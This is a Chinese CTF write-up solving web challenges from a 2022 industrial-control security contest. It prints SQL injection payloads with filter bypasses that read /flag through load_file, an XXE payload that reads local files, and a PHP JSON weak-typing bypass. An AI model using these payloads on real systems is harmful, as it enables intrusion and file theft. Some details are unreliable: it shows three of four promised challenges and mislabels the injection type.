---
title: 2022 IS 河南工业控制安全部分 Web 题解
contest: IS河南工控安全
year: 2022
difficulty: easy
vuln_type: sqli
tags: [SQL注入, XXE, JSON弱类型, array_search, load_file, 二次注入, 信息泄露]
attack_chain:
  - 单引号闭合确认 SQL 注入
  - 绕过 select 过滤用 selselectect + unioN 大小写混写
  - order by 判断列数为 3
  - 联合查询 information_schema 拿 security 库所有表
  - load_file(/var/www/html/index.php) 读源码发现非预期
  - load_file(/flag) 直拿根目录 flag
  - 经典 XXE 协议流向 doLogin.php 读 /flag
  - JSON year=2022a 弱类型绕过 int 比较
key_payload: 'union/**/seselectlect/**/1,load_file("/flag"),3'
one_liner: 4 道 Web：二次注入 + 经典 XXE + JSON array_search 弱类型 + load_file 非预期。
lesson: SQL 注入过滤 select 可用 selselectect 大小写混写；JSON 弱类型是 array_search 经典坑。
quality: medium
---

# 2022 IS 河南工业控制安全部分 Web 题解

## 来源
- 原文：ctfiot.com/90304.html
- 团队：天权信安网络安全团队

## 4 道 Web 详解

### 1. HNGK-兰亭集序（SQL 二次注入）
- 注入点：`?id=1'`
- 过滤绕过：`or` 关键字过滤 → 加空格 `infO rmation`；`select` 过滤 → `seselectlect` 双写
- 列数判断：3
- 注入 payload：
  ```
  ?id=-1'union/**/seselectlect/**/1,2,group_concat(schema_name)/**/from/**/infO rmation_schema.schemata%23
  ?id=-1'unioN/**/sselectelect/**/1,load_file("/flag"),3/**/%23
  ```
- **非预期**：security 库全是 SQLi 靶场表，flag 在根目录，直接 `load_file("/flag")`

### 2. HNGK-xxx（XXE）
- 注入点：`doLogin.php`
- 经典协议流：
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE any [
  <!ENTITY xxe SYSTEM "file:///flag" >]>
  <root>&xxe;111</root>
  ```
- 一发入魂

### 3. HNGK-phpgame（JSON 弱类型）
- 源码分析：
  ```php
  $info["year"] == 2022           // 弱类型比较
  is_array($info["items"])        // 数组
  count($info["items"]) !== 3     // 长度 3
  array_search("game", $info["items"])  // 弱类型 == 0
  ```
- 绕过 payload：
  ```json
  {"year":"2022a","items":[0,["a"],"g"]}
  ```
- `array_search` 的弱类型坑：整形 0 与 "game" 比较时 intval("game")=0，相等
- 第二项 `["a"]` 绕过 `!is_array($info["items"][1])`（仍是 array，is_array 通过，但外层 count 不算）

## 适用场景
- SQL 注入过滤绕过（双写/大小写/关键字加空格）
- XXE 经典协议流
- PHP 弱类型 + array_search 绕过

## 同题同源
2022 年 4 题 web 全部解出，作者团队长期招新，邮件 megrez@megrezsec.cn
